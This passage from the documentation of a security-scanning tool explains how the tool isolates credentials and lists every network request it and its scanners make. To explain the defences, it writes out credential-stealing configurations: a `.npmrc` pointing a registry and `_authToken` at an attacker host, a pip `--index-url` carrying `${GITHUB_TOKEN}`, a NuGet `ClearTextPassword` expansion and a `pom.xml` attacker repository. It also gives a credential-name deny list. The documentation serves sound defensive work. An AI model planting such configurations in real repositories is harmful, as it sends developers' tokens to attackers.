  directories, the locale, `CI`, the variables every Windows process expects,
  and the toolchains' own (`NODE_*`, `PYTHON*`, `DOTNET_*`, `CARGO_HOME`,
  `RUSTUP_HOME`, `GOPATH`, `GOCACHE`, …), with any name that looks like a credential
  (`TOKEN`, `SECRET`, `PASSWORD`, `AUTH`, `API_KEY`, …), every `GUARDIAN_*`
  and every `npm_config_*` removed — no token or cloud credential the server
  was started with reaches it. It is still the repository's code, running as
  you, with your files: run `create_fix_pr` only on a repository whose tests
  you would run yourself.
- **WP-CLI boots the site it audits — without its plugins and theme.**
  `wp_audit` (every mode), `wp_report`'s plugin kind and `wp_vuln_check` with
  an install path run WP-CLI, which runs the site's PHP to answer from its
  database. Every call passes `--skip-plugins --skip-themes`, names the site
  with `--path` and starts in a temporary directory of its own holding an
  empty `wp-cli.yml` — so the site's `wp-cli.yml` / `wp-cli.local.yml`, whose
  `require:` WP-CLI would load as PHP, is never read — and gets the test
  command's allowlisted environment above plus `WP_CLI_*`, `PHPRC`,
  `PHP_INI_SCAN_DIR` and the proxy variables (`mcp/src/wordpress/wpCli.ts`).
  What WP-CLI cannot skip still runs: the site's `wp-config.php` (`wp config
  get` evaluates it too), its WordPress core files, its must-use plugins and
  its drop-ins (`wp-content/db.php`, `object-cache.php`,
  `advanced-cache.php`). On a site copied off a compromised server those may
  be altered too: read its code first (`scan_wordpress`), and run the WP-CLI
  audits only on a copy you would let boot.
- **A repository never chooses where `create_fix_pr`'s package managers send
  your credentials.** A repository `.npmrc` with `registry=https://attacker/`
  and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
  `npm install` and `npm audit` in its checkouts fetch from that host with
  your own token (`--ignore-scripts` does not stop a fetch); a scoped
  registry (`@acme:registry=…`) is the same route, and a requirements file's
  `--index-url` makes `pip-audit` install from — and build sdists fetched
  from — the repository's index. In every checkout `create_fix_pr` works in
  (the planning tree, the fix's worktree, the base-commit tree), the
  repository's own `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`,
  `pip.conf`, `pip.ini`, `.pip/`, `.cargo/config.toml` / `.cargo/config`,
  `.bundle/config` and `NuGet.config` — in the project's directory and every
  directory above it in the checkout — are moved out before any package
  manager runs, named in the group's `package_config_set_aside`, and put back
  before anything is committed. Every package-manager process it runs, itself
  or through `deps_update_plan` and `deps_audit` (`npm`, `pip-audit`,
  `composer`, `cargo`, `go`, `dotnet restore`), gets the test
  command's allowlisted environment plus your own package-manager
  configuration: the `NPM_CONFIG_*`, `YARN_*`, `PIP_*`, `COMPOSER_*`,
  `CARGO_REGISTRIES_*`, `BUNDLE_*`, `NUGET_*`, `GOPROXY`-family and proxy
  variables, and exactly the variables your own `~/.npmrc` (or the file
  `NPM_CONFIG_USERCONFIG` names), `~/.yarnrc` and `~/.yarnrc.yml` reference
  as `${VAR}` — so a token you configured for your own registry still
  reaches it, and only it. Python requirements are held to an **allowlist,
  and it fails closed** (`mcp/src/deps/pipRequirements.ts`): pip installs —
  a pip step, or any re-scan by `deps_audit`, whose pip-audit installs them
  — only when every logical line of every requirements file, read the way
  pip reads it (its BOMs and UTF-16, a `# -*- coding` declaration, every
  line break `str.splitlines` knows, `\` continuations joined, comments not
  joined), is blank, a comment, a plain PEP 508 requirement with no URL
  (a name, extras, versions, markers, `--hash`), or a `-r` / `-c` include
  (`-rbase.txt` glued, `--requirement=…`, or an absolute path) that stays
  inside the checkout, which is read the same way (at most 200 files).
  Anything else refuses the fix with the file, the line and the
  kind named, and a host as `scheme://host` only — never a user name,
  password, port, path or query: an index option in any spelling pip
  accepts (`--index`, `-ihttps://…`), an editable, a direct reference, a
  bare or VCS URL, a local or network path (`\\host\share`,
  `file://host/…`), an environment variable, a quoted or escaped option,
  an encoding pip would read differently (UTF-7, UTF-32), an include that
  leaves the checkout or is a URL, and a file that could not be read. The
  rule was held to pip 26.2.1's own `RequirementsFileParser`: for every
  bypass of the regular expressions it replaced — and more — where pip
  chooses a source, dev-guardian refuses (`test/unit/deps/pipAllowlist.test.ts`).
  `pyproject.toml` and `setup.cfg` meet the same rule — `[project]`
  dependencies, optional dependencies, dependency groups and build
  requirements must be plain, and a tool's own source table (`[tool.uv.sources]`,
  `[[tool.uv.index]]`, `[[tool.poetry.source]]`, a Poetry `git`/`url`/`path`
  dependency, `[tool.pdm.source]`, Hatch's `allow-direct-references`,
  `dependency_links`) refuses; when pip-audit would build the project itself,
  dependencies the build backend decides (`dynamic`, no `[project]`) refuse
  too. Failing closed has costs, and these are the known ones: an
  abbreviated or quoted option pip would accept (`--requirem`, `-r "a.txt"`),
  an include written with a backslash (pip's parser reads `-r reqs\base.txt`
  as `reqsbase.txt` — measured — so the refusal says pip would open a
  different file), a `~`, drive-relative or rootless-on-Windows include, a
  chain past 200 requirements files, an environment variable anywhere, a
  UTF-7 or UTF-32 file, and a local or `file:` requirement inside the checkout
  are all refused although some are harmless; `requirements.in`-style
  indirection is followed only through plain includes. An npm install —
  `create_fix_pr`'s planning, its npm steps, and its test environment's
  `npm ci` — also **fails closed**: it is refused when a dependency, an
  override, a resolution or any lock entry points at a network path
  (`file:\\host\…`, `file://host/…`), and when any file npm reads could not
  be fully read and checked — `package.json`, `package-lock.json`,
  `npm-shrinkwrap.json`, `yarn.lock` and every workspace member's
  `package.json` (a lock past the parse bound or the size cap, one that is
  not JSON, a FIFO, a link out, a member the walk could not reach): Windows
  would authenticate to the host, and npm reads what this check could not.
  `deps_audit` itself does not
  refuse: it names, per file, the index options, the direct, VCS and network
  references and whatever it could not check, on the run
  (`honoured_config`). So is a Composer fix whose
  `composer.json` declares `repositories` (the manifest the fix edits cannot
  be set aside); the planner does not plan Composer there either. A
  lockfile's own `resolved` URLs still choose where npm fetches each locked
  tarball from, but not where your token goes: measured with real npm
  (11.17.0 on Windows, 10.9.8 in `node:22`) and two local registries, `npm ci` and
  `npm install` fetched a tarball the lock placed on another host without
  any `Authorization` header, while the tarball on your own registry carried
  your token — npm scopes a token to the host it was configured for, and a
  test holds `create_fix_pr` to it. Composer runs with `--no-plugins` (a
  plugin a committed `vendor/` holds activated on `composer outdated`, the
  repository's `allow-plugins` letting it — measured), and `require` with
  `--no-install`. Bundler never runs: every Bundler command, `bundle lock`
  included, evaluates the Gemfile, which is Ruby code — a gem gets no step,
  and its CVE is named in `unplanned`. **`deps_update_plan` called directly**
  holds to the same rules without a disposable checkout: every package
  manager gets the allowlisted environment above; `npm outdated` runs on a
  copy of `package.json` and its lock files in a temporary directory, so the
  repository's `.npmrc` is never read (named in `package_config_not_read`:
  measured, it sent the server's `GITHUB_TOKEN` to the scoped registry it
  named) and a network-path dependency is refused as above; `cargo outdated`
  does not run where the repository has its own `.cargo/config.toml` (an
  alias for `outdated`, a `rustc-wrapper`) or a `rust-toolchain` with a
  `path`, in the project's directory or one above it up to the repository
  root. Its .NET restore still runs the project's MSBuild code (see "Network
  egress"). **`deps_audit` called directly** holds to them too (3.7.0; it
  used to keep the server's whole environment and the repository's `.npmrc`).
  Measured on npm 11.20.0: run in the project, `npm audit` read a repository
  `.npmrc` of `registry=http://<attacker>/` and
  `//<attacker>/:_authToken=${GITHUB_TOKEN}`, and POSTed the dependency list
  to the attacker with `Authorization: Bearer <the server's GITHUB_TOKEN>` —
  whose `{}` then read as a clean audit. `npm audit` now runs on the same copy
  of the manifests as `npm outdated`: the project's `.npmrc`, `.pnpmrc`,
  `.yarnrc` and `.yarnrc.yml` — its directory's and each above it up to the
  repository root — are never read, and are named in the result's
  `package_config_not_read` and on the npm run; a network-path dependency
  makes npm audit a named gap, never a clean one. A project whose `.npmrc`
  names a private registry is audited against **your** npm configuration
  instead (`~/.npmrc` or the file `NPM_CONFIG_USERCONFIG` names, and the
  `NPM_CONFIG_*` variables): the run names the registry the project named, to
  set in your own `~/.npmrc` if you want it asked — and its `omit=dev` or
  `audit-level` no longer narrow what is reported. `pip-audit`, `dotnet
  restore` and `dotnet list package` get the allowlisted environment too, and
  so do `scan_sast`'s `dotnet restore` and `dotnet build` (3.7.0: they ran
  the project's MSBuild with the server's whole environment). A
  repository still configures them where they read it, and each such file is
  named on its run: a requirements file's index options and references
  (pip expands a `${VAR}` there — measured on pip 26.2.1, a
  `--index-url http://x:${GITHUB_TOKEN}@<host>/simple` sent the token as
  Basic credentials, and the literal `${GITHUB_TOKEN}` once the variable was
  not in its environment), and a `NuGet.config` anywhere in the project,
  whose feeds answer the restore and whose `packageSourceCredentials` NuGet
  expands `%VAR%` into (measured on the .NET SDK 10.0.403: a feed's
  `ClearTextPassword` of `%GITHUB_TOKEN%` reached it as Basic credentials
  after a 401, the literal once the variable was gone). What those
  configurations, an sdist's build or the project's MSBuild can still reach
  is what the allowlist passes — your package managers' own variables
  (`PIP_*`, `NUGET_*`, `NuGetPackageSourceCredentials_*`, …) — and what your
  account can read, never a token or cloud credential the server was started
  with. **NuGet binds a credential to a feed's NAME**, and a repository
  `NuGet.config` can give a name another URL — measured on the .NET SDK
  10.0.403, your `corp` feed's user name and password (from your
  `NuGet.Config`, a drop-in beside it, or `NuGetPackageSourceCredentials_corp`)
  went to the repository's `corp` URL, through a `<clear/>` and from a
  project's directory below the solution too, and your own feed was not
  asked. So no restore runs (`scan_sast`, `deps_audit`, `deps_update_plan`,
  and `create_fix_pr`'s re-scans and `dotnet add package` steps) before
  dev-guardian has read the chain the way NuGet reads it (each project's
  directory up to the filesystem root; `%APPDATA%\NuGet` or
  `~/.nuget/NuGet` and its `config/*.config`; the machine's `NuGet\Config`):
  a feed the repository declares under a name you hold a credential for, on
  another server than your own feed of that name (or with no feed of yours of
  that name), refuses the restore — a named gap with the feed and the file,
  never the credential (`nuget_credential_rebound`). So does a network path
  in a repository config, and a config on either side that could not be read.
  MSBuild chooses the chain too (a project's `RestoreConfigFile`,
  `RestoreRootConfigDirectory`, `RestoreSolutionDirectory` — measured, each
  sent the credential to a feed no walk reaches): every restore passes them
  empty on the command line, which the project cannot override, and a project
  that keeps them with `TreatAsLocalProperty` is refused
  (`nuget_config_redirected`). A repository `http_proxy` is not read by the
  restore (measured). Still not covered: the restore's MSBuild is the
  project's code running as you, and can read your `NuGet.Config` itself —
  run a .NET scan of a repository you do not trust only where its build may
  run.

## Network egress

`GUARDIAN_OFFLINE=1` stops the lookups dev-guardian makes on its own initiative
— marked ★ below: threat intelligence, package vetting, `scan_skill`'s OSV
lookup, live secret verification, the Wordfence / wordpress.org feed and
`scan_containers`' cosign check of an image's signature. What could not be checked
is then reported as `unknown` or as a coverage gap, never as clean. It does
**not** stop a request to a target you named (DAST, a skill URL, a Lighthouse
URL), anything a third-party scanner or build tool does on its own, or the
project's own build and test commands.

### Requests dev-guardian makes

| Destination | Who contacts it | When |
| --- | --- | --- |
| `api.osv.dev` | `vet_packages` ★, the install hook ★, `scan_skill` with `check_deps` ★ (offline, `osv.dev` reads `skipped`) | per call |
| `registry.npmjs.org`, `pypi.org`, `repo.packagist.org`, `api.nuget.org`, `azuresearch-usnc.nuget.org` | `vet_packages` ★, the install hook ★ (3 s budget) | per call; the hook only for a command that installs a package by name |
| `www.cisa.gov` (KEV catalog), `api.first.org` (EPSS) | `prioritize_findings` ★, `risk_score` ★, `create_fix_pr` ★ | at most once per 24 h per CVE and for the catalog; `guardian://cves/active` only reads the cache |
| The secret's own provider: `api.github.com`, `gitlab.com`, `slack.com`, `api.stripe.com`, `api.openai.com`, `api.anthropic.com`, `registry.npmjs.org`, `api.sendgrid.com` | `scan_secrets` with `verify_live: true` ★ | **off by default**. Each secret goes only to its own provider's read-only identity endpoint (a fixed URL per rule, never a host from the repository), 5 s timeout, at most 4 in flight and 50 per scan; `security_scan_full` never verifies |
| `www.wordfence.com`, `api.wordpress.org` | `wp_vuln_check` (`mode: "source"`) ★ | Wordfence only with `WORDFENCE_API_KEY`; the feed is cached for 24 h |
| The target you name | `scan_dast` (loopback only unless `authorized_target: true`), `wp_vuln_check` (`mode: "rest"`), the CLI's DAST health check | per call. `scan_dast` classifies the target by its URL alone and does **not pin the address a hostname resolves to**: every request (and nuclei) resolves it again, so a name you authorised that its DNS rebinds mid-scan — to `127.0.0.1`, `169.254.169.254`, an internal host — is probed there, the authenticated variant with your `Authorization` header. Give an IP literal as `base_url` where that matters. Redirects are never followed, by nuclei either |
| The URL you name | `scan_skill` given an HTTP(S) or git URL | per call |
| A remote MCP server you name — a URL entry, a UNC command, or the URL a proxy on the command line talks to | `audit_mcp_tools` with `allow_remote: true` (`initialize` and the list methods only) | per call; without `allow_remote` that server is skipped |

### Requests the scanners and tools dev-guardian runs make

| Destination | Who triggers it | When |
| --- | --- | --- |
| Semgrep registry (`semgrep.dev`) — rules download **and usage metrics to Semgrep Inc.** | `scan_sast` and `security_scan_full` (`--config=auto`), `review_pr`, `bug_hunt` (`p/r2c-bug-scan`, `p/security-audit`, optional language packs), `scan_wordpress` (`p/php`, `p/wordpress`), `audit_executive` (through `security_scan_full`, and `scan_wordpress` on a WordPress project), `init_project`'s first-pass status report (`semgrep --config=auto`, when a bash other than WSL's is available), `create_fix_pr`'s re-scans (`scan_sast` with the original scan's `local_only`, `bug_hunt`'s packs) | by default. Semgrep refuses `--config=auto` with metrics off, so `scan_sast`, `security_scan_full`, `review_pr`, `audit_executive` and the CLI's `--local-only` offer `local_only: true`: only rules on disk, `--metrics=off`, nothing sent to Semgrep's registry or metrics endpoint. `bug_hunt` and `scan_wordpress` have no local-only mode; `audit_executive` with `local_only` skips `scan_wordpress` and says so. Semgrep's `--metrics=auto` also sends metrics with local rules when you are logged in to Semgrep, which is how `map_attack_surface` can send them. What Semgrep collects: <https://semgrep.dev/docs/metrics>. `compliance_check` (RGPD pack) and `create_fix_pr`'s autofix always run with `--metrics=off`. |
| Semgrep's version check (`semgrep.dev`) | **disabled by dev-guardian**: every Semgrep run gets `SEMGREP_ENABLE_VERSION_CHECK=0` — native runs (`mcp/src/runners/semgrepRun.ts`), the Docker fallback's container (`-e`), `check_toolchain`'s `semgrep --version`, and `init_project`'s status script | never. Measured through a refusing proxy on 1.176.1: `semgrep --version`, and a scan with local rules and `--metrics=off`, each asked for `semgrep.dev` four times with a fresh home; with the variable, neither asked, and the scan's results were the same. |
| The project's NuGet feeds, and its MSBuild code | `scan_sast` on a .NET project (`dotnet restore --locked-mode`, then `dotnet build`) — **even with `local_only: true`** — and so `security_scan_full`, `audit_executive`, the CLI `scan` (under `--baseline-ref` / `--rules-ref` only with `--build-pr`) and `create_fix_pr`'s re-scans; `deps_audit` (and `audit_executive`, which runs it) and `deps_update_plan` (`dotnet restore`, `dotnet list package`) | when the .NET SDK is installed: for `scan_sast`, whenever a root `.csproj` / `.fsproj` / `.sln` / `.slnx` is present; for `deps_audit` and `deps_update_plan`, for every `.sln` / `.csproj` they find. A restore and a build execute the project's own MSBuild targets. A feed the repository declares under the name of one you hold a credential for, on another server, refuses the restore before it runs (see "A repository never chooses where … your credentials"). |
| The Go module proxy (`proxy.golang.org`, or the project's `GOPROXY`) and checksum database (`sum.golang.org`); a Go toolchain download | `scan_sast` on a Go project — gosec loads every package through `go list` — **even with `local_only: true`**, and so `security_scan_full`, `review_pr`, `audit_executive`, the CLI `scan` and `create_fix_pr`'s re-scans; `deps_audit` (govulncheck, which loads the packages the same way) | when gosec and Go are installed and a module's dependencies are not in the module cache; a `GOFLAGS` `-mod=mod` is run as `-mod=readonly`, so `go.mod` and `go.sum` are never rewritten. When `go.mod` names a newer Go and `GOTOOLCHAIN` allows it, `go` downloads that toolchain. With cgo files, `go list` runs the C compiler over them, as a build would. A warm module cache, a `vendor/` directory or `GOPROXY=off` keep it local; a dependency that cannot be loaded is a named partial gap (`Type error`), never a clean package. A scanned repository does not choose this host: `GOPROXY`, `GONOSUMDB`, `GOINSECURE` and `GOFLAGS` are read from the environment and the user's `go env` file (`$GOENV`, else `~/.config/go/env`) and the toolchain's `go.env` in `GOROOT`, never from a repository's `go.mod`/`go.sum` (the go.mod grammar has no directive for them); a `go.mod` `replace` points only at another module or a local path, not a URL, and its `-mod=mod` is run as `-mod=readonly`. |
| The Go vulnerability database (`vuln.go.dev`, run by Google) | `deps_audit` on a Go project (govulncheck, once per module), and `audit_executive` through it | when govulncheck and Go are installed; it reads the database's index and the entries of the vulnerabilities that concern the modules the project requires. An unreachable database fails that module's run, named, never a clean one. |
| Docker registry (`semgrep/semgrep` image) | `scan_sast`, `map_attack_surface` | only when Semgrep is not installed and Docker is |
| Trivy's vulnerability database and misconfiguration checks bundle | `scan_deps`, `deps_audit`, `scan_containers`, `scan_iac`, `review_pr`, `scan_wordpress`, `security_scan_full` and `audit_executive` (through them — **even with `local_only: true`**), `create_fix_pr`'s re-scans, `init_project`'s status report | when Trivy needs them and its local cache is stale; `scan_containers` may also pull the image it is given |
| The image's registry, and Sigstore's public-good trust root (`tuf-repo-cdn.sigstore.dev`) — Rekor (`rekor.sigstore.dev`) only for a signature that carries no inclusion proof | `scan_containers` given an `image`, which runs cosign ★: `cosign triangulate` (to pin the digest), then `cosign download signature` and `cosign download attestation` without a signer, `cosign verify` with `signer_identity` + `signer_issuer` (Sigstore's trust root is fetched for `verify` only) — all of one image's calls within one deadline, `GUARDIAN_SCAN_TIMEOUT_MS` | per call, when cosign is installed; `GUARDIAN_OFFLINE=1` starts no cosign at all (`cosign` is then skipped and in `missing_tools`). cosign reads registry credentials from the Docker config, like Trivy, and keeps its trust root under `~/.sigstore`. It never signs, attests or pushes anything. The downloads that decide an absence run with cosign's `-d` request log, which is parsed, never stored or forwarded (go-containerregistry already writes `Authorization: <redacted>`; URL query strings — a CDN's signed URL — are cut from every reason, finding and log line): what is attached is the referrers index the registry itself generated, read from that log (never `cosign tree`, which prints a pusher's annotation as it finds it), and whether each referrer was served is the registry's own status for its manifest and bundle. Two registry faults cosign itself does not report. (1) A referrer whose manifest or bundle blob the registry fails to serve (a 5xx, a 429, a refusal, a transport error) is skipped in silence; dev-guardian reports it as unknown, never as unsigned or rejected — so too a referrer the log never shows fetched, and a log cut at its size cap. A bundle answered 200 whose body then breaks mid-transfer reads exactly like one that does not parse: an existence check downloads once more and, still without it, reports unknown; a verification, after its own re-run, rejects — and says the bundle was listed and served but cosign could not use it, not a bundle it can parse or a transfer that failed mid-body, to re-run if the registry was unstable. On a registry with no referrers API, the `sha256-<hex>` fallback tag that stands in for the index is written by whoever can push, not by the registry, and cosign is silent about anything there it cannot use: a tag the registry served that holds no index cosign reads, or an entry of it cosign never fetched, is nothing attached (it is read as go-containerregistry reads it, so what cosign did fetch from it is judged like any referrer); only the registry failing to serve the tag withholds. (2) A referrers API answering with no OCI index at all — an HTML 200, a 400, a 406 — is read by go-containerregistry as "no referrers API", and every signature and attestation attached as a referrer silently disappears — a signed image then reads unsigned (an existence check says absent; a verification reports a high "no signature" finding). No request fails, so neither cosign nor dev-guardian can report it. (An index served with a Content-Type other than exactly the OCI index type, which go-containerregistry ignores the same way, is seen: its body is in the log, and what it lists cosign never fetched is unknown.) |
| A Maven repository a `pom.xml` names, or Maven Central | **stopped by dev-guardian**: every `trivy fs`-family scan (`scan_deps`, `deps_audit`, `review_pr`, `scan_wordpress`, `compliance_check`'s license scan, `generate_sbom`, and these under `security_scan_full` / `audit_executive` — **even with `local_only: true`**) now passes Trivy's `--offline-scan` (`mcp/src/runners/trivyRun.ts`) | never. Measured on Trivy 0.74.0: a repository `pom.xml` (or a parent POM it ships) declaring `<repositories><repository><url>http://attacker/</url>` made `trivy fs` fetch every dependency's POM from that host — the project's coordinates to a host the repository chose — and, when `~/.m2/settings.xml` held a `<server>` whose id matched the repository's, sent that user name and password (Basic) with each request; the same name-binding attack as NuGet. `--offline-scan` stopped every such request. Its cost — Trivy then reports a pom's directly declared dependencies but not the transitive ones it would fetch — is a named partial gap (`trivy:maven-offline`) whenever a `pom.xml` was scanned, never a clean Maven pass: resolve a Maven repository you trust with a real build and re-run. A `<distributionManagement>` or a profile `<repository>` did not redirect the resolution (measured). |
| Trivy's version check and anonymous usage telemetry (`check.trivy.dev`) | **disabled by dev-guardian**: every Trivy run gets `TRIVY_SKIP_VERSION_CHECK=true` and `TRIVY_DISABLE_TELEMETRY=true`, and a Trivy 0.63.0 or newer also `--skip-version-check --disable-telemetry` (`mcp/src/runners/trivyRun.ts`; `init_project`'s status script sets the two variables) | never. Measured through a refusing proxy on 0.69.3: only both settings together stop the request; each alone does not. Trivy before 0.63.0 has neither the check nor the flags. |
| Package registries, through the package managers | `deps_audit` and `audit_executive`, which runs it (`npm audit` on a copy of the manifests, so the registry of your own npm configuration, never one the project's `.npmrc` names; `pip-audit`, which installs the requirements into a temporary virtualenv from PyPI, or from the index a requirements file names — named on the run) — **even with `local_only: true`**, `deps_update_plan` (`npm outdated` on a copy of the manifests, `composer outdated --no-plugins`, `go list -m -u`, `cargo outdated`; never Bundler), `create_fix_pr` (installs in its worktree with `--ignore-scripts` / `--no-scripts --no-plugins`) | per call |
| The project's own test command and whatever it fetches | `create_fix_pr` runs `npm test`, `pytest`, `cargo test` or `go test ./...` in its worktrees — the project's own code, with an allowlisted environment that carries no token or credential of the server's (see [Hardening posture](#hardening-posture)) — (`cargo` and `go` download the project's dependencies; `npm ci --ignore-scripts` runs first when there is a lock file) | only for a candidate fix, dry runs included |
| nuclei's update check and templates | `scan_dast` with `use_nuclei` | nuclei's own automatic update check and template download are on by default; dev-guardian does not pass `-disable-update-check` |
| The .NET SDK's telemetry (`dc.services.visualstudio.com`, Application Insights) | **disabled by dev-guardian**: every `dotnet` it starts — `scan_sast`'s restore and build, `deps_audit`'s and `deps_update_plan`'s restores and `dotnet list package`, `check_toolchain`'s `dotnet --list-sdks`, `install_toolchain`'s `dotnet tool install`, `create_fix_pr`'s `dotnet add package` and re-scans — gets `DOTNET_CLI_TELEMETRY_OPTOUT=1` and `DOTNET_NOLOGO=1`, set by the process runner over any value of yours (`mcp/src/runners/processRunner.ts`) | never. Measured on SDK 10.0.403 through a refusing proxy with a fresh `DOTNET_CLI_HOME`: every `dotnet restore`, `build` and `list package` after the first opened three connections to `dc.services.visualstudio.com:443`; with the variable, none. |
| Syft's update check (`toolbox-data.anchore.io`) | **disabled by dev-guardian**: every Syft run gets `SYFT_CHECK_FOR_APP_UPDATE=false`, and `-c` pointing at an empty file, so a repository's `.syft.yaml` cannot turn on Syft's network lookups either (`mcp/src/runners/syftRun.ts`) | never |
| The GitHub API | `scan_iac`'s zizmor, when a GitHub token (`GH_TOKEN`) is in the server's environment | zizmor's online audits; without a token it runs offline |
| WPScan API, and the site itself | `wp_vuln_check` (through the `wpscan` CLI) | per call |
| WPScan's database (`data.wpscan.org`) | `wp_vuln_check` runs `wpscan --update` | only when WPScan reports its local database missing (`scan_aborted: Update required`), once per call, then the scan runs again; never with `GUARDIAN_OFFLINE=1` (the scan is then failed, naming `wpscan --update`). An existing database is never refreshed: scans pass `--no-update`. |
| `api.wordpress.org` | `wp_audit` (`mode` install or bulk: WP-CLI `verify-checksums`) | per call |
| The target you name | `perf_check` (Lighthouse URL, k6 script) | per call |
| GitHub, through `gh` and `git` | `create_github_issues`, `create_fix_pr` with `apply: true` | only when asked; dry runs push nothing |
| Package managers and install scripts (winget, scoop, choco, apt, brew, pipx, npm, uv, cargo, go, gem; `curl` and PowerShell's `Invoke-WebRequest` for pinned GitHub release archives and Maven Central jars) | `install_toolchain` | only when asked; `dry_run` prints the commands. Syft, Trivy, gitleaks and cosign are pinned to one release and sha256-checked before they are unpacked (see "Hardening posture"); so are Psalm's release PHAR and detekt's jar (Maven Central, its signature verified when pinned) before they are copied, and SpotBugs' archive and the FindSecBugs jar (Maven Central) before they are unpacked; RuboCop is a pinned gem from RubyGems (`gem install --user-install --conservative`) |
| The dev-guardian repository (`git ls-remote`) | `dev-guardian ci-init` | only when the release tag is not in the local checkout |
| Sigstore (Fulcio, Rekor — or GitHub's own Sigstore instance for a private repository) and GitHub's attestations API | the pipeline `dev-guardian ci-init github --attest` generates, from your CI runner — `ci-init` itself contacts neither | on a push, in the generated `attest` job only: it signs a build-provenance attestation of the two report files with the job's OIDC identity. Only that job holds `id-token: write`. |
| Whatever a started MCP server contacts | `audit_mcp_tools`, for each stdio server named in `servers` | per call; the server runs until its listing is read, then its process tree is killed |

`map_attack_surface` itself sends nothing, but the Semgrep it runs does what
the rows above say: metrics when you are logged in (its version check is off).
Psalm (`scan_sast` and `scan_wordpress` on PHP) makes no request — traced on
6.20.1 — and is never passed `--shepherd`, which uploads statistics. It is run
with dev-guardian's own configuration and an empty root directory of its own:
the project's `psalm.xml` is never read and its `vendor/autoload.php` never
runs (with the project as its root, Psalm runs it). The
hooks' SessionStart and secret-warning branches, `detect_stack`,
`audit_agent_config`, `observability_setup`, the `status` and `dashboard` CLI
commands and the history readers (`diff_scans`, `set_baseline`,
`suppress_finding`, `prioritize_findings` with `view: "triage"`, `health_status`,
the resources) make no network request.
